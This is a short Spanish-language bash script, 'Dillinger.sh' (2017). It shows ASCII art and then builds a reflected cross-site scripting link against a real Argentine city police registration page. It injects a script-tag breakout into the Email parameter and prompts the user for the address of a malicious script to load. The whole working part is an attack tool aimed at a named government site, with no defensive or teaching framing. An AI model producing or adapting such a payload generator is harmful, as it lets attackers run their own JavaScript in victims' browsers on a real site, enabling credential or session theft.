#!/bin/bash
#
cat << "EOF"
````````.`````.:syhhddhyo:..:.````````````````````
`````````````:ydmmNNNNNNNmmmmyydsoshhyo:``````````
``````````.-odmmmNNNNNNNNNmmmNmmmmmmmmdho.````````
``.````..-oddmmNNNNNNNNmNNNNNmmmmmmmmmdddo.```````
......../hmmNNNNmmNNNmmmmmmmdddhhyhhhhyyhd/```````
......./yydmNNmmmmdmddhdhddhhhyyyysssyhhyhy.``````
......:ydmNNNmmmmmmmddddhhhhddyhyso+++ohhyy+``````
....-/hdNNNmdhhdhddddhyso+/++//:-------:oyos+`````
....:odmNNdyssoo++++++//:--.............-/+sh+````
....-/dNNmyso++/::::-----................-:shh.```
.....omNNhyoo++/::----........````.......--ods````
...--hNNdysooo+/::-----.......````......---/ys````
....:dNmhyysoo+//::----................----/ss````
-.-.-hmmhhyysss+/::-----...............----/ss````
----./mmdhyyyyso+/::----.............-----:/oy.```
------mmmhhyyyyo+/:---..............------::+s:...
------ommhhhysso+///:-----...--:+ossooo+/:::/s:-::
---:yysmdhyyhddhhddddhy+//---:+yhhyysoo+/:-:/s/---
---/mdhmmhyyhhhddhhdhhhhyo:.-:+ss+ss++o+:--::s/:-.
----ddhmmhyysyhdhyss++++so:.-::://///:--..-://---`
----/hhddhhyo++ooo+//:/+so/--::-..-----..--://-:.`
-----+hhdddhs+/::/:::::+oo/--:::-.......--:/+::-``
------oyhddhhso+//::::/oso/---:/::--...--:/++::.``
-------/yhdhhys+///::/oyys/---/o+//:----::/+/...``
--------/ohdhsoo++///osyhdyo++oo/:---:/::///:.....
::::------/hhyooo++++oossyso+///:::::://:///-.....
:::::------ohysss++++oosssso/++sssoss+:/://:......
/::::-----.-shyysoooohddhhhysosssoo///////+.......
/::::::---..-yyyyssyhhyhyyo+///////:://++++.......
//::::::----.odhyhhyysooossoosoo+/////+++o::......
//:::::-----/+hdhhhhhyyysso++++/::///+oo+-.y+-....
///::::----+mo:+hddddhyso+/:://:-::/+oo:.``sdho:--
//:::::--:yNNs:--/ohhdhyssoo+ss++++o+:.````+ddmddy
//:::::/ymNNNh:--...:/oyhhdddddhs+:.```````+dddddd
///+shmNNNNNNm/---.......:smmmms.``````````odddddd
shmNNNNNNNNNNNh--.....````ymdhyso`````````.hdddddd
NNNNNNNNNNNNNNNs......````sdyoshs.````````+dmddddd
NNNNNNNNNNNNNNNNs....`````ohooho/-```````-hdmddddd
NNNNNNNNNNNNNNNNm+..`````.shyys-:..``````:ddmddddd
NNNNNNNNNNNNNNNNNy-..````:syoods/-..`````oddmddddd
NNNNNNNNNNNNNNNNNm:...`./+hysossso:-.````ydddddddd
EOF

echo -e "Dillinger.sh\n"
echo -e "2017\n"
urlvulnerable='http://policiadelaciudad.gob.ar/inscribite/validar.php?Email="><script src="'
posturlvulnerable='"></script>&Codigo_Verificacion=0xplaguedoktor'
read -p "Ingrese la url del script malicioso a cargar: " texto_a_ingresar
urlmaliciosa="$urlvulnerable$texto_a_ingresar$posturlvulnerable"
echo -e "\nSe ha creado la URL maliciosa:"
echo -e "\n$urlmaliciosa" | sed 's/\ /%20/g'
